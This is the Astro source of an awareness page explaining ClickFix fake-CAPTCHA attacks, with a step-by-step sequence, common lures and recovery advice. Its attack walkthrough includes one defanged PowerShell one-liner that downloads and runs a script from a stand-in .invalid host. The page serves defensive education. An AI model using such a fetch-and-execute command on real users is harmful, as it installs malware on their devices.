---
import Layout from "../layouts/Layout.astro";
import Header from "../components/Header.astro";
import InteractiveDemo from "../components/Demo.astro";
import NewsComponent from "../components/News.astro";
---

<Layout title="ClickFix: from fake CAPTCHA to command execution — ClickFix.fyi" description="A working ClickFix demo, an explanation of the attack, and steps to take if you ran the command.">
  <Header />

  <main id="main-content" class="docs-layout container">
    <aside class="docs-nav" aria-label="On this page">
      <p>On this page</p>
      <nav>
        <a href="#demo">Demo</a>
        <a href="#how-it-works">How it works</a>
        <a href="#common-prompts">Common fake prompts</a>
        <a href="#already-ran-it">If you ran it</a>
        <a href="#sources">News</a>
      </nav>
    </aside>

    <article class="docs-article">
      <header class="article-header" id="overview">
        <h1>ClickFix: from fake CAPTCHA to command execution</h1>
        <p class="article-summary">
          ClickFix is a social engineering technique that uses fake CAPTCHAs or error messages to trick someone into copying and running a command. The command typically downloads malware.
        </p>
        <p class="demo-intro">The interactive demo below reproduces this sequence using a harmless script.</p>
      </header>

      <section id="demo" class="demo-section">
        <InteractiveDemo />
      </section>

      <section id="how-it-works">
        <h2>How it works</h2>
        <p>ClickFix is a way to deliver malware, not a specific piece of malware. What gets installed varies between campaigns.</p>
        <ol class="sequence detailed-sequence">
          <li><div><strong>The page shows a fake prompt.</strong><p>A malicious or compromised page displays a familiar CAPTCHA, browser error, meeting problem, or document error.</p></div></li>
          <li><div><strong>The button copies a command.</strong><p>The button claims to copy a verification code or fix. It copies a command instead.</p></div></li>
          <li><div><strong>The user opens a system tool.</strong><p>The page directs the user to open Run, PowerShell, Terminal, Command Prompt, or File Explorer.</p></div></li>
          <li><div><strong>The user runs the command.</strong><p>The system tool executes whatever the attacker placed on the clipboard.</p><pre aria-label="Defanged example ClickFix command"><code>powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://secure-check.example.invalid/update.ps1 | iex"</code></pre><small>The reserved <code>.invalid</code> domain cannot resolve, so this example cannot download a payload.</small></div></li>
          <li><div><strong>The command downloads malware.</strong><p>The downloaded malware then runs on the device.</p></div></li>
        </ol>

      </section>

      <section id="common-prompts">
        <h2>Common fake prompts</h2>
        <ul class="disguise-list">
          <li>“Verify you are human”</li>
          <li>“Your browser needs an update”</li>
          <li>“The document cannot be displayed”</li>
          <li>“Your microphone or meeting connection failed”</li>
        </ul>
      </section>

      <section id="already-ran-it">
        <h2>If you ran the command</h2>
        <div class="warning compact" role="note">
          <strong>Treat the device as compromised.</strong>
        </div>
        <ol class="response-list">
          <li><strong>Disconnect the affected computer.</strong> Turn off Wi-Fi and unplug the network cable.</li>
          <li><strong>Secure your accounts.</strong> From another device, sign out active sessions and change credentials that may have been exposed.</li>
          <li><strong>Clean or rebuild the device.</strong> A clean antivirus scan does not prove the malware is gone. Reinstall the operating system or have the device inspected.</li>
        </ol>
      </section>

      <section id="sources">
        <h2>ClickFix news</h2>
        <NewsComponent />
      </section>
    </article>
  </main>
</Layout>

<style>
  .docs-layout {
    display: grid;
    grid-template-columns: 190px minmax(0, 900px);
    gap: clamp(3rem, 8vw, 7rem);
    justify-content: center;
    padding-block: 3rem 6rem;
  }

  .docs-nav {
    position: sticky;
    top: 104px;
    align-self: start;
    border-left: 1px solid var(--line);
    padding-left: 1rem;
  }

  .docs-nav > p {
    margin-bottom: 0.7rem;
    color: var(--ink);
    font-size: 0.78rem;
    font-weight: 700;
  }

  .docs-nav nav {
    display: grid;
    gap: 0.55rem;
  }

  .docs-nav a {
    color: var(--ink-soft);
    font-size: 0.82rem;
    line-height: 1.35;
    text-decoration: none;
  }

  .docs-nav a:hover { color: var(--signal); }

  .docs-article { min-width: 0; }

  .article-header {
    padding-bottom: 0;
  }

  .article-header h1 {
    margin-bottom: 1rem;
    font-size: clamp(2.3rem, 5vw, 3.75rem);
  }

  .article-summary {
    max-width: 44rem;
    margin: 0;
    color: var(--ink-soft);
    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
    line-height: 1.55;
  }

  .demo-intro {
    max-width: 44rem;
    margin: 0.85rem 0 0;
    color: var(--ink-soft);
    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
    line-height: 1.55;
  }

  .docs-article section {
    padding-block: 2.75rem;
    border-bottom: 1px solid var(--line);
    scroll-margin-top: 100px;
  }

  .docs-article .demo-section { padding-top: 1.5rem; }

  .docs-article section h2 {
    margin-bottom: 1rem;
    font-size: clamp(1.65rem, 3vw, 2.15rem);
  }

  .docs-article section > p,
  .docs-article li {
    color: var(--ink-soft);
    font-size: 1rem;
  }

  .warning {
    margin-block: 2rem;
    border: 1px solid #d8a6a0;
    border-left: 5px solid var(--signal);
    padding: 1.1rem 1.25rem;
    background: #fff5f4;
  }

  .warning strong { color: var(--signal-dark); }
  .warning p { margin: 0.35rem 0 0; color: var(--ink-soft); }
  .warning.compact { margin-block: 1.25rem 1.75rem; }

  .sequence {
    margin: 1.5rem 0;
    padding: 0;
    list-style: none;
    counter-reset: step;
  }

  .sequence li {
    display: grid;
    grid-template-columns: 2rem minmax(0, 1fr);
    gap: 0.8rem;
    padding: 1rem 0;
    counter-increment: step;
  }

  .sequence li > div { min-width: 0; }

  .sequence li + li { border-top: 1px solid #d9dee1; }
  .sequence li::before { content: counter(step) "."; color: var(--signal); font-family: var(--font-mono); font-weight: 700; }
  .sequence strong { color: var(--ink); }
  .sequence p { margin: 0.25rem 0 0; }

  .detailed-sequence small { display: block; margin-top: 0.45rem; color: var(--ink-soft); }
  pre { overflow-x: auto; margin: 0.9rem 0 0; border: 1px solid #3b4348; border-radius: 4px; padding: 0.9rem; background: #171c20; color: #e8ecee; }
  pre code { padding: 0; background: transparent; }
  .disguise-list { margin: 1.4rem 0 0; padding-left: 1.25rem; }
  .disguise-list li { margin-bottom: 0.65rem; }

  .response-list { padding-left: 1.35rem; }
  .response-list li { margin-bottom: 0.9rem; padding-left: 0.3rem; }
  .response-list strong { color: var(--ink); }

  .docs-article section:last-child { border-bottom: 0; }

  @media (max-width: 800px) {
    .docs-layout { grid-template-columns: 1fr; gap: 0; padding-top: 2rem; }
    .docs-nav { display: none; }
  }

  @media (max-width: 520px) {
    .docs-layout { padding-bottom: 3rem; }
    .article-header h1 { font-size: 2rem; line-height: 1.08; }
    .article-summary,
    .demo-intro { font-size: 1rem; }
    .docs-article section { padding-block: 2.25rem; }
  }
</style>
